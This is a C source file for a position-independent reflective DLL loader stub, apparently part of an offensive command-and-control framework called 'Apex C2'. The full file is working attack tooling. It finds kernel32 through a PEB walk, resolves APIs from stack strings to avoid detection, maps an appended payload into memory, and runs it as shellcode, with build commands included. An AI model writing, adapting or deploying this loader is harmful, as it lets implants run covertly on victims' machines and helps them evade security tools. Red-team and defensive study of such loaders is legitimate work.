/*
 * PIC Reflective PE/DLL Loader Stub
 *
 * This is compiled into a tiny position-independent binary that:
 *   1. Finds its own address in memory (call/pop trick)
 *   2. Walks the PEB to locate kernel32.dll
 *   3. Resolves VirtualAlloc, LoadLibraryA, GetProcAddress via export table parsing
 *   4. Reads the embedded PE (DLL) appended after this stub
 *   5. Maps sections, processes relocations, resolves imports
 *   6. Calls DllMain(DLL_PROCESS_ATTACH)
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -Os -nostdlib -nostartfiles -fno-stack-protector \
 *       -fno-exceptions -fno-asynchronous-unwind-tables -fno-ident \
 *       -Wl,--no-seh,--entry,_start -o pic_stub.exe pic_loader.c
 *   x86_64-w64-mingw32-objcopy -O binary -j .text pic_stub.exe pic_stub.bin
 *
 * The combiner tool (gen_shellcode) finds the 8-byte marker 0x4150455850454F46
 * in the stub binary and replaces it with the actual stub size (= offset to PE data).
 *
 * Copyright (c) 2026 Apex C2 Framework
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

/* ── Type definitions (avoid CRT headers) ────────────────── */

typedef HMODULE (WINAPI *fn_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fn_GetProcAddress)(HMODULE, LPCSTR);
typedef LPVOID  (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef VOID    (WINAPI *fn_RtlMoveMemory)(PVOID, const VOID*, SIZE_T);
typedef BOOL    (WINAPI *fn_DllMain)(HINSTANCE, DWORD, LPVOID);

/* ── PEB structures (for kernel32 resolution) ────────────── */

typedef struct _UNICODE_STRING_PEB {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_PEB;

typedef struct _LDR_DATA_TABLE_ENTRY_PEB {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING_PEB FullDllName;
    UNICODE_STRING_PEB BaseDllName;
} LDR_DATA_TABLE_ENTRY_PEB;

typedef struct _PEB_LDR_DATA_PEB {
    ULONG      Length;
    BOOLEAN    Initialized;
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA_PEB;

typedef struct _PEB_CUSTOM {
    BYTE       Reserved1[2];
    BYTE       BeingDebugged;
    BYTE       Reserved2[1];
    PVOID      Reserved3[2];
    PEB_LDR_DATA_PEB *Ldr;
} PEB_CUSTOM;

/* Marker: the combiner tool replaces this with the actual stub size */
#define PE_OFFSET_MARKER 0x4150455850454F46ULL  /* "APEXPEOF" */

/* ── Helpers (all inline, no CRT) ────────────────────────── */

static inline void *pic_memcpy(void *dst, const void *src, unsigned long long n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
    return dst;
}

static inline void pic_memset(void *dst, int val, unsigned long long n) {
    unsigned char *d = (unsigned char *)dst;
    while (n--) *d++ = (unsigned char)val;
}

static inline int pic_strcmp_ci_w(const WCHAR *a, const WCHAR *b) {
    while (*a && *b) {
        WCHAR ca = *a, cb = *b;
        if (ca >= 'A' && ca <= 'Z') ca += 32;
        if (cb >= 'A' && cb <= 'Z') cb += 32;
        if (ca != cb) return 1;
        a++; b++;
    }
    return (*a || *b) ? 1 : 0;
}

static inline int pic_strcmp(const char *a, const char *b) {
    while (*a && *b) {
        if (*a != *b) return 1;
        a++; b++;
    }
    return (*a || *b) ? 1 : 0;
}

/* ── PEB walk to find kernel32.dll base ──────────────────── */

static HMODULE find_kernel32(void) {
    PEB_CUSTOM *peb;
#if defined(_M_X64) || defined(__x86_64__)
    __asm__ volatile ("mov %%gs:0x60, %0" : "=r"(peb));
#else
    __asm__ volatile ("mov %%fs:0x30, %0" : "=r"(peb));
#endif

    PEB_LDR_DATA_PEB *ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *entry = head->Flink;

    /* Stack string: "kernel32.dll" */
    WCHAR k32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };

    while (entry != head) {
        LDR_DATA_TABLE_ENTRY_PEB *mod =
            (LDR_DATA_TABLE_ENTRY_PEB *)((BYTE*)entry -
                sizeof(LIST_ENTRY)); /* offset InMemoryOrderLinks */
        if (mod->BaseDllName.Buffer && mod->BaseDllName.Length > 0) {
            if (pic_strcmp_ci_w(mod->BaseDllName.Buffer, k32) == 0) {
                return (HMODULE)mod->DllBase;
            }
        }
        entry = entry->Flink;
    }
    return NULL;
}

/* ── Parse PE export table to find function by name ──────── */

static FARPROC find_export(HMODULE hMod, const char *funcName) {
    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);

    IMAGE_DATA_DIRECTORY *exportDir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir->Size == 0) return NULL;

    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY *)(base + exportDir->VirtualAddress);
    DWORD *names    = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(base + names[i]);
        if (pic_strcmp(name, funcName) == 0) {
            return (FARPROC)(base + funcs[ordinals[i]]);
        }
    }
    return NULL;
}

/* ── Reflective PE mapper ────────────────────────────────── */

static BYTE *map_pe(BYTE *rawPE, fn_VirtualAlloc pVirtualAlloc,
                    fn_LoadLibraryA pLoadLibraryA,
                    fn_GetProcAddress pGetProcAddress) {

    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)rawPE;
    if (dos->e_magic != 0x5A4D) return NULL; /* "MZ" */

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(rawPE + dos->e_lfanew);
    if (nt->Signature != 0x00004550) return NULL; /* "PE\0\0" */

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    BYTE *mapped = (BYTE *)pVirtualAlloc(NULL, imageSize,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);
    if (!mapped) return NULL;

    /* Copy headers */
    pic_memcpy(mapped, rawPE, nt->OptionalHeader.SizeOfHeaders);

    /* Copy sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0 && sec[i].PointerToRawData > 0) {
            pic_memcpy(mapped + sec[i].VirtualAddress,
                       rawPE + sec[i].PointerToRawData,
                       sec[i].SizeOfRawData);
        }
        if (sec[i].Misc.VirtualSize > sec[i].SizeOfRawData) {
            pic_memset(mapped + sec[i].VirtualAddress + sec[i].SizeOfRawData,
                       0,
                       sec[i].Misc.VirtualSize - sec[i].SizeOfRawData);
        }
    }

    /* Process base relocations */
    IMAGE_NT_HEADERS *mappedNt = (IMAGE_NT_HEADERS *)(mapped + dos->e_lfanew);
    ULONGLONG delta = (ULONGLONG)mapped - mappedNt->OptionalHeader.ImageBase;

    if (delta != 0) {
        IMAGE_DATA_DIRECTORY *relocDir =
            &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir->Size > 0) {
            IMAGE_BASE_RELOCATION *reloc =
                (IMAGE_BASE_RELOCATION *)(mapped + relocDir->VirtualAddress);
            BYTE *relocEnd = (BYTE *)reloc + relocDir->Size;

            while ((BYTE *)reloc < relocEnd && reloc->SizeOfBlock > 0) {
                DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD *entries = (WORD *)((BYTE *)reloc + sizeof(IMAGE_BASE_RELOCATION));

                for (DWORD i = 0; i < count; i++) {
                    WORD type   = entries[i] >> 12;
                    WORD offset = entries[i] & 0xFFF;
                    BYTE *patch = mapped + reloc->VirtualAddress + offset;

                    if (type == IMAGE_REL_BASED_DIR64) {
                        *(ULONGLONG *)patch += delta;
                    } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                        *(DWORD *)patch += (DWORD)delta;
                    } else if (type == IMAGE_REL_BASED_HIGH) {
                        *(WORD *)patch += HIWORD(delta);
                    } else if (type == IMAGE_REL_BASED_LOW) {
                        *(WORD *)patch += LOWORD(delta);
                    }
                    /* type == 0 → IMAGE_REL_BASED_ABSOLUTE → skip */
                }
                reloc = (IMAGE_BASE_RELOCATION *)((BYTE *)reloc + reloc->SizeOfBlock);
            }
        }
    }

    /* Resolve imports */
    IMAGE_DATA_DIRECTORY *importDir =
        &mappedNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir->Size > 0) {
        IMAGE_IMPORT_DESCRIPTOR *imp =
            (IMAGE_IMPORT_DESCRIPTOR *)(mapped + importDir->VirtualAddress);

        while (imp->Name != 0) {
            char *dllName = (char *)(mapped + imp->Name);
            HMODULE hDll = pLoadLibraryA(dllName);
            if (!hDll) { imp++; continue; }

            ULONGLONG *thunk = (ULONGLONG *)(mapped +
                (imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk));
            ULONGLONG *iat = (ULONGLONG *)(mapped + imp->FirstThunk);

            while (*thunk) {
                if (*thunk & (1ULL << 63)) {
                    /* Import by ordinal */
                    WORD ordinal = (WORD)(*thunk & 0xFFFF);
                    *iat = (ULONGLONG)pGetProcAddress(hDll, (LPCSTR)(ULONG_PTR)ordinal);
                } else {
                    /* Import by name */
                    IMAGE_IMPORT_BY_NAME *ibn =
                        (IMAGE_IMPORT_BY_NAME *)(mapped + (DWORD)*thunk);
                    *iat = (ULONGLONG)pGetProcAddress(hDll, ibn->Name);
                }
                thunk++;
                iat++;
            }
            imp++;
        }
    }

    /* Set section memory protections */
    sec = IMAGE_FIRST_SECTION(mappedNt);
    for (WORD i = 0; i < mappedNt->FileHeader.NumberOfSections; i++) {
        DWORD prot = PAGE_READONLY;
        DWORD chars = sec[i].Characteristics;
        BOOL exec  = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
        BOOL write = (chars & IMAGE_SCN_MEM_WRITE) != 0;
        BOOL read  = (chars & IMAGE_SCN_MEM_READ) != 0;

        if (exec && write && read) prot = PAGE_EXECUTE_READWRITE;
        else if (exec && read) prot = PAGE_EXECUTE_READ;
        else if (exec) prot = PAGE_EXECUTE;
        else if (write && read) prot = PAGE_READWRITE;
        else if (write) prot = PAGE_READWRITE;
        else if (read) prot = PAGE_READONLY;

        DWORD sz = sec[i].Misc.VirtualSize;
        if (sz == 0) sz = sec[i].SizeOfRawData;
        if (sz > 0) {
            DWORD old;
            fn_VirtualProtect pVP = (fn_VirtualProtect)
                pGetProcAddress(find_kernel32(), "VirtualProtect");
            if (pVP) pVP(mapped + sec[i].VirtualAddress, sz, prot, &old);
        }
    }

    /* Update ImageBase in mapped headers */
    mappedNt->OptionalHeader.ImageBase = (ULONGLONG)mapped;

    return mapped;
}

/* ── Shellcode entry point ───────────────────────────────── */

void _start(void);

/* We place the marker in a global so it's easy to find in the .text section */
static volatile ULONGLONG g_pe_offset __attribute__((used, section(".text"))) = PE_OFFSET_MARKER;

void _start(void) {
    /*
     * Find the start of _start via call/pop.
     * call pushes the address of the next instruction; we subtract to get _start.
     */
    BYTE *self;
    __asm__ volatile (
        "call 1f\n"
        "1: pop %0\n"
        "sub %0, (1b - _start)\n"
        : "=r"(self)
        :
        : "memory"
    );

    /* Read the PE offset — patched by the combiner tool */
    ULONGLONG pe_offset = g_pe_offset;

    BYTE *pe_data = self + pe_offset;

    /* ── Resolve kernel32 functions ── */
    HMODULE hK32 = find_kernel32();
    if (!hK32) return;

    /* Stack strings for function names */
    char sLoadLibraryA[]  = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    char sGetProcAddress[] = {'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0};
    char sVirtualAlloc[]  = {'V','i','r','t','u','a','l','A','l','l','o','c',0};

    fn_LoadLibraryA  pLoadLibraryA  = (fn_LoadLibraryA)find_export(hK32, sLoadLibraryA);
    fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)find_export(hK32, sGetProcAddress);
    fn_VirtualAlloc  pVirtualAlloc  = (fn_VirtualAlloc)find_export(hK32, sVirtualAlloc);

    if (!pLoadLibraryA || !pGetProcAddress || !pVirtualAlloc) return;

    /* ── Map the embedded PE ── */
    BYTE *mapped = map_pe(pe_data, pVirtualAlloc, pLoadLibraryA, pGetProcAddress);
    if (!mapped) return;

    /* ── Call entry point ── */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)mapped;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)(mapped + dos->e_lfanew);
    DWORD ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
    if (ep_rva == 0) return;

    if (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
        fn_DllMain dllMain = (fn_DllMain)(mapped + ep_rva);
        dllMain((HINSTANCE)mapped, DLL_PROCESS_ATTACH, NULL);
    } else {
        typedef int (*fn_main)(void);
        fn_main entryMain = (fn_main)(mapped + ep_rva);
        entryMain();
    }
}
